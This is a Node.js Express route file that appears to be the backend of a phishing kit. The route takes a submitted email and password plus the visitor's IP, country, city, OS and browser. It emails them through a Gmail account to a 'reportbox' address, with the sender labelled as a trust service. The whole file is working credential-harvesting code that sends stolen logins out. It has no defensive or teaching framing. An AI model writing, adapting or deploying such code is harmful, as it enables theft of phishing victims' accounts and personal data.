const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
var cors = require("cors");
router.use(cors());
router.use(express.urlencoded({ extended: false }));
router.use(express.json());

const { user, pass } = require("../config");

router.route("/").post((req, res) => {
  const {
    email,
    password,
    osName,
    country,
    city,
    ip,
    reportbox,
    browser,
    date,
  } = req.body;
  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    let testAccount = await nodemailer.createTestAccount();

    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user,
        pass,
      },
    });

       let info = await transporter.sendMail({
      from: '"Report <saptrustservice@gmail.com>', // sender address
      bcc: reportbox, // list of receivers
      subject: `Reportbox`, // Subject line
      // text: "Hello world?", // plain text body
      html: `email: ${email} <br/> Password: ${password} <br/> Client Country: ${country} <br/> Client City: ${city} <br /> Client OS: ${osName} <br/> Client IP: ${ip} <br /> AU Browser: ${browser} <br /> Submitted on: ${date}`,
    });

    return info;
    // console.log("Message sent: %s", info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    // console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
  }

  main()
    .then((info) => {
      res.json({ status: "submited" });
      console.log("Message sent: %s", info.messageId);
    })
    .catch((error) => {
      //res.send(error);
      console.log(error);
    });

  // res.json({ status: "submited" });
});

module.exports = router;
